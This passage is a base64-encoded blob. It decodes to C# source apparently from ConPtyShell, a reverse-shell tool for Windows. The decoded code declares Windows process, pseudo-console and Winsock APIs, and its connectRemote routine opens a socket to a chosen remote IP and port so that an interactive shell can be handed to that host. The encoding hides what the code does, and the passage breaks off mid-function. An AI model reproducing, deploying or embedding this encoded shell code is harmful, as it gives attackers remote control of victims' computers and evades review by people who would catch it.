ElORV9BVVRPX1JFVFVSTiA9IDB4MDAwODsKICAgIHByaXZhdGUgY29uc3QgdWludCBQUk9DX1RIUkVBRF9BVFRSSUJVVEVfUFNFVURPQ09OU09MRSA9IDB4MDAwMjAwMTY7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgRVhURU5ERURfU1RBUlRVUElORk9fUFJFU0VOVCA9IDB4MDAwODAwMDA7CiAgICBwcml2YXRlIGNvbnN0IGludCBTVEFSVEZfVVNFU1RESEFORExFUyA9IDB4MDAwMDAxMDA7CiAgICBwcml2YXRlIGNvbnN0IGludCBCVUZGRVJfU0laRV9QSVBFID0gMTA0ODU3NjsKICAgIHByaXZhdGUgY29uc3QgaW50IFdTQV9GTEFHX09WRVJMQVBQRUQgPSAweDE7CiAgICBwcml2YXRlIGNvbnN0IFVJbnQzMiBJTkZJTklURSA9IDB4RkZGRkZGRkY7CiAgICBwcml2YXRlIGNvbnN0IGludCBTV19ISURFID0gMDsKICAgIHByaXZhdGUgY29uc3QgdWludCBHRU5FUklDX1JFQUQgPSAweDgwMDAwMDAwOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IEdFTkVSSUNfV1JJVEUgPSAweDQwMDAwMDAwOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IEZJTEVfU0hBUkVfUkVBRCA9IDB4MDAwMDAwMDE7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgRklMRV9TSEFSRV9XUklURSA9IDB4MDAwMDAwMDI7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgRklMRV9BVFRSSUJVVEVfTk9STUFMID0gMHg4MDsKICAgIHByaXZhdGUgY29uc3QgdWludCBPUEVOX0VYSVNUSU5HID0gMzsKICAgIHByaXZhdGUgY29uc3QgaW50IFNURF9JTlBVVF9IQU5ETEUgPSAtMTA7CiAgICBwcml2YXRlIGNvbnN0IGludCBTVERfT1VUUFVUX0hBTkRMRSA9IC0xMTsKICAgIHByaXZhdGUgY29uc3QgaW50IFNURF9FUlJPUl9IQU5ETEUgPSAtMTI7CiAgICBwcml2YXRlIGNvbnN0IGludCBXU0FFV09VTERCTE9DSyA9IDEwMDM1OwogICAgcHJpdmF0ZSBjb25zdCBpbnQgRkRfUkVBRCA9ICgxIDw8IDApOwoKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0cnVjdCBTVEFSVFVQSU5GT0VYCiAgICB7CiAgICAgICAgcHVibGljIFNUQVJUVVBJTkZPIFN0YXJ0dXBJbmZvOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBBdHRyaWJ1dGVMaXN0OwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIEludDMyIGNiOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgcHVibGljIEludDMyIGR3WDsKICAgICAgICBwdWJsaWMgSW50MzIgZHdZOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIEludDMyIGR3RmxhZ3M7CiAgICAgICAgcHVibGljIEludDE2IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBJbnQxNiBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU0VDVVJJVFlfQVRUUklCVVRFUwogICAgewogICAgICAgIHB1YmxpYyBpbnQgbkxlbmd0aDsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwU2VjdXJpdHlEZXNjcmlwdG9yOwogICAgICAgIHB1YmxpYyBpbnQgYkluaGVyaXRIYW5kbGU7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgQ09PUkQKICAgIHsKICAgICAgICBwdWJsaWMgc2hvcnQgWDsKICAgICAgICBwdWJsaWMgc2hvcnQgWTsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBXU0FEYXRhCiAgICB7CiAgICAgICAgcHVibGljIHNob3J0IHdWZXJzaW9uOwogICAgICAgIHB1YmxpYyBzaG9ydCB3SGlnaFZlcnNpb247CiAgICAgICAgcHVibGljIHNob3J0IGlNYXhTb2NrZXRzOwogICAgICAgIHB1YmxpYyBzaG9ydCBpTWF4VWRwRGc7CiAgICAgICAgcHVibGljIEludFB0ciBscFZlbmRvckluZm87CiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0ID0gMjU3KV0KICAgICAgICBwdWJsaWMgc3RyaW5nIHN6RGVzY3JpcHRpb247CiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0ID0gMTI5KV0KICAgICAgICBwdWJsaWMgc3RyaW5nIHN6U3lzdGVtU3RhdHVzOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFNPQ0tBRERSX0lOCiAgICB7CiAgICAgICAgcHVibGljIHNob3J0IHNpbl9mYW1pbHk7CiAgICAgICAgcHVibGljIHNob3J0IHNpbl9wb3J0OwogICAgICAgIHB1YmxpYyB1aW50IHNpbl9hZGRyOwogICAgICAgIHB1YmxpYyBsb25nIHNpbl96ZXJvOwogICAgfQoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QoSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgaW50IGR3QXR0cmlidXRlQ291bnQsIGludCBkd0ZsYWdzLCByZWYgSW50UHRyIGxwU2l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUoSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgdWludCBkd0ZsYWdzLCBJbnRQdHIgYXR0cmlidXRlLCBJbnRQdHIgbHBWYWx1ZSwgSW50UHRyIGNiU2l6ZSwgSW50UHRyIGxwUHJldmlvdXNWYWx1ZSwgSW50UHRyIGxwUmV0dXJuU2l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgRW50cnlQb2ludCA9ICJDcmVhdGVQcm9jZXNzIildCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3NFeChzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCByZWYgU0VDVVJJVFlfQVRUUklCVVRFUyBscFByb2Nlc3NBdHRyaWJ1dGVzLCByZWYgU0VDVVJJVFlfQVRUUklCVVRFUyBscFRocmVhZEF0dHJpYnV0ZXMsIGJvb2wgYkluaGVyaXRIYW5kbGVzLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwRW52aXJvbm1lbnQsIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksIFtJbl0gcmVmIFNUQVJUVVBJTkZPRVggbHBTdGFydHVwSW5mbywgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIEVudHJ5UG9pbnQgPSAiQ3JlYXRlUHJvY2VzcyIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhhbmRsZXMsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwgW0luXSByZWYgU1RBUlRVUElORk8gbHBTdGFydHVwSW5mbywgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBUZXJtaW5hdGVQcm9jZXNzKEludFB0ciBoUHJvY2VzcywgdWludCB1RXhpdENvZGUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBXYWl0Rm9yU2luZ2xlT2JqZWN0KEludFB0ciBoSGFuZGxlLCBVSW50MzIgZHdNaWxsaXNlY29uZHMpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0U3RkSGFuZGxlKGludCBuU3RkSGFuZGxlLCBJbnRQdHIgaEhhbmRsZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFN0ZEhhbmRsZShpbnQgblN0ZEhhbmRsZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQaXBlKG91dCBJbnRQdHIgaFJlYWRQaXBlLCBvdXQgSW50UHRyIGhXcml0ZVBpcGUsIHJlZiBTRUNVUklUWV9BVFRSSUJVVEVTIGxwUGlwZUF0dHJpYnV0ZXMsIGludCBuU2l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlRmlsZShzdHJpbmcgbHBGaWxlTmFtZSwgdWludCBkd0Rlc2lyZWRBY2Nlc3MsIHVpbnQgZHdTaGFyZU1vZGUsIEludFB0ciBTZWN1cml0eUF0dHJpYnV0ZXMsIHVpbnQgZHdDcmVhdGlvbkRpc3Bvc2l0aW9uLCB1aW50IGR3RmxhZ3NBbmRBdHRyaWJ1dGVzLCBJbnRQdHIgaFRlbXBsYXRlRmlsZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkRmlsZShJbnRQdHIgaEZpbGUsIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwgdWludCBuTnVtYmVyT2ZCeXRlc1RvUmVhZCwgb3V0IHVpbnQgbHBOdW1iZXJPZkJ5dGVzUmVhZCwgSW50UHRyIGxwT3ZlcmxhcHBlZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZUZpbGUoSW50UHRyIGhGaWxlLCBieXRlW10gbHBCdWZmZXIsIHVpbnQgbk51bWJlck9mQnl0ZXNUb1dyaXRlLCBvdXQgdWludCBscE51bWJlck9mQnl0ZXNXcml0dGVuLCBJbnRQdHIgbHBPdmVybGFwcGVkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgQ3JlYXRlUHNldWRvQ29uc29sZShDT09SRCBzaXplLCBJbnRQdHIgaElucHV0LCBJbnRQdHIgaE91dHB1dCwgdWludCBkd0ZsYWdzLCBvdXQgSW50UHRyIHBoUEMpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBDbG9zZVBzZXVkb0NvbnNvbGUoSW50UHRyIGhQQyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRDb25zb2xlTW9kZShJbnRQdHIgaENvbnNvbGVIYW5kbGUsIHVpbnQgbW9kZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBHZXRDb25zb2xlTW9kZShJbnRQdHIgaGFuZGxlLCBvdXQgdWludCBtb2RlKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQWxsb2NDb25zb2xlKCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRnJlZUNvbnNvbGUoKTsKCiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDb25zb2xlV2luZG93KCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldE1vZHVsZUhhbmRsZShzdHJpbmcgbHBNb2R1bGVOYW1lKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2ksIEV4YWN0U3BlbGxpbmcgPSB0cnVlLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2ksIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBXU0FTb2NrZXQoW0luXSBBZGRyZXNzRmFtaWx5IGFkZHJlc3NGYW1pbHksIFtJbl0gU29ja2V0VHlwZSBzb2NrZXRUeXBlLCBbSW5dIFByb3RvY29sVHlwZSBwcm90b2NvbFR5cGUsIFtJbl0gSW50UHRyIHByb3RvY29sSW5mbywgW0luXSB1aW50IGdyb3VwLCBbSW5dIGludCBmbGFncyk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBjb25uZWN0KEludFB0ciBzLCByZWYgU09DS0FERFJfSU4gYWRkciwgaW50IGFkZHJzaXplKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdXNob3J0IGh0b25zKHVzaG9ydCBob3N0c2hvcnQpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IGluZXRfYWRkcihzdHJpbmcgY3ApOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnQzMiBXU0FHZXRMYXN0RXJyb3IoKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50MzIgV1NBU3RhcnR1cChJbnQxNiB3VmVyc2lvblJlcXVlc3RlZCwgb3V0IFdTQURhdGEgd3NhRGF0YSk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBjbG9zZXNvY2tldChJbnRQdHIgcyk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCByZWN2KEludFB0ciBTb2NrZXQsIGJ5dGVbXSBidWYsIGludCBsZW4sIHVpbnQgZmxhZ3MpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgc2VuZChJbnRQdHIgU29ja2V0LCBieXRlW10gYnVmLCBpbnQgbGVuLCB1aW50IGZsYWdzKTsKCiAgICBbRGxsSW1wb3J0KCJXUzJfMzIuRExMIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIFdTQUNyZWF0ZUV2ZW50KCk7CgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBXU0FFdmVudFNlbGVjdChJbnRQdHIgcywgSW50UHRyIGhFdmVudE9iamVjdCwgaW50IGxOZXR3b3JrRXZlbnRzKTsKCiAgICBbRGxsSW1wb3J0KCJXUzJfMzIuRExMIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IFdTQVdhaXRGb3JNdWx0aXBsZUV2ZW50cyhpbnQgY0V2ZW50cywgSW50UHRyW10gbHBoRXZlbnRzLCBib29sIGZXYWl0QWxsLCBpbnQgZHdUaW1lb3V0LCBib29sIGZBbGVydGFibGUpOwoKICAgIFtEbGxJbXBvcnQoIldTMl8zMi5ETEwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFdTQVJlc2V0RXZlbnQoSW50UHRyIGhFdmVudCk7CgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgV1NBQ2xvc2VFdmVudChJbnRQdHIgaEV2ZW50KTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IE50U3VzcGVuZFByb2Nlc3MoSW50UHRyIHByb2Nlc3NIYW5kbGUpOwoKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRSZXN1bWVQcm9jZXNzKEludFB0ciBwcm9jZXNzSGFuZGxlKTsKCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIEluaXRXU0FUaHJlYWQoKQogICAgewogICAgICAgIFdTQURhdGEgZGF0YTsKICAgICAgICBpZiAoV1NBU3RhcnR1cCgyIDw8IDggfCAyLCBvdXQgZGF0YSkgIT0gMCkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKFN0cmluZy5Gb3JtYXQoIldTQVN0YXJ0dXAgZmFpbGVkIHdpdGggZXJyb3IgY29kZTogezB9IiwgV1NBR2V0TGFzdEVycm9yKCkpKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgY29ubmVjdFJlbW90ZShzdHJpbmcgcmVtb3RlSXAsIGludCByZW1vdGVQb3J0KQogICAgewogICAgICAgIGludCBwb3J0ID0gMDsKICAgICAgICBpbnQgZXJyb3IgPSAwOwogICAgICAgIHN0cmluZyBob3N0ID0gcmVtb3RlSXA7CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgcG9ydCA9IENvbnZlcnQuVG9JbnQzMihyZW1vdGVQb3J0KTsKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiU3BlY2lmaWVkIHBvcnQgaXMgaW52YWxpZDogIiArIHJlbW90ZVBvcnQuVG9TdHJpbmcoKSk7CiAgICAgICAgfQoKICAgICAgICBJbnRQdHIgc29ja2V0ID0gSW50UHRyLlplcm87CiAgICAgICAgc29ja2V0ID0gV1NBU29ja2V0KEFkZHJlc3NGYW1pbHkuSW50ZXJOZXR3b3JrLCBTb2NrZXRUeXBlLlN0cmVhbSwgUHJvdG9jb2xUeXBlLklQLCBJbnRQdHIuWmVybywgMCwgV1NBX0ZMQUdfT1ZFUkxBUFBFRCk7CiAgICAgICAgU09DS0FERFJfSU4gc29ja2luZm8gPSBuZXcgU09DS0FERFJfSU4oKTsKICAgICAgICBzb2NraW5mby5zaW5fZmFtaWx5ID0gKHNob3J0KTI7CiAgICAgICAgc29ja2luZm8uc2luX2FkZHIgPSBpbmV0X2FkZHIoaG9zdCk7CiAgICAgICAgc29ja2luZm8uc2luX3BvcnQgPSAoc2hvcnQpaHRvbnMoKHVzaG9ydClwb3J0KTsKCiAgICAgICAgaWYgKGNvbm5lY3Qoc29ja2V0LCByZWYgc29ja2luZm8sIE1hcnNoYWwuU2l6ZU9mKHNvY2tpbmZvKSkgIT0gMCkKICAgICAgICB7CiAgICAgICAgICAgIGVycm9yID0gV1NBR2V0TGFzdEVycm9yKCk7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbihTdHJpbmcuRm9ybWF0KCJXU0FDb25uZWN0IGZhaWxlZCB3aXRoIGVycm9yIGNvZGU6IHswfSIsIGVycm9yKSk7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gc29ja2V0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgVHJ5UGFyc2VSb3dzQ29sc0Zyb21Tb2NrZXQoSW50UHRyIHNoZWxsU29ja2V0LCByZWYgdWludCByb3dzLCByZWYgdWludCBjb2xzKQogICAgewogICAgICAgIFRocmVhZC5TbGVlcCg1MDApOy8vbGl0dGxlIHR3ZWFrIGZvciBzbG93ZXIgY29ubmVjdGlvbnMKICAgICAgICBieXRlW10gcmVjZWl2ZWQgPSBuZXcgYnl0ZVsxMDBdOwogICAgICAgIGludCByb3dzVGVtcCwgY29sc1RlbXA7CiAgICAgICAgaW50IGJ5dGVzUmVjZWl2ZWQgPSByZWN2KHNoZWxsU29ja2V0LCByZWNlaXZlZCwgMTAwLCAwKTsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHN0cmluZyBzaXplUmVjZWl2ZWQgPSBFbmNvZGluZy5BU0NJSS5HZXRTdHJpbmcocmVjZWl2ZWQsIDAsIGJ5dGVzUmVjZWl2ZWQpOwogICAgICAgICAgICBzdHJpbmcgcm93c1N0cmluZyA9IHNpemVSZWNlaXZlZC5TcGxpdCgnICcpWzBdLlRyaW0oKTsKICAgICAgICAgICAgc3RyaW5nIGNvbHNTdHJpbmcgPSBzaXplUmVjZWl2ZWQuU3BsaXQoJyAnKVsxXS5UcmltKCk7CiAgICAgICAgICAgIGlmIChJbnQzMi5UcnlQYXJzZShyb3dzU3RyaW5nLCBvdXQgcm93c1RlbXApICYmIEludDMyLlRyeVBhcnNlKGNvbHNTdHJpbmcsIG91dCBjb2xzVGVtcCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJvd3MgPSAodWludClyb3dzVGVtcDsKICAgICAgICAgICAgICAgIGNvbHMgPSAodWludCljb2xzVGVtcDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIENyZWF0ZVBpcGVzKHJlZiBJbnRQdHIgSW5wdXRQaXBlUmVhZCwgcmVmIEludFB0ciBJbnB1dFBpcGVXcml0ZSwgcmVmIEludFB0ciBPdXRwdXRQaXBlUmVhZCwgcmVmIEludFB0ciBPdXRwdXRQaXBlV3JpdGUpCiAgICB7CiAgICAgICAgU0VDVVJJVFlfQVRUUklCVVRFUyBwU2VjID0gbmV3IFNFQ1VSSVRZ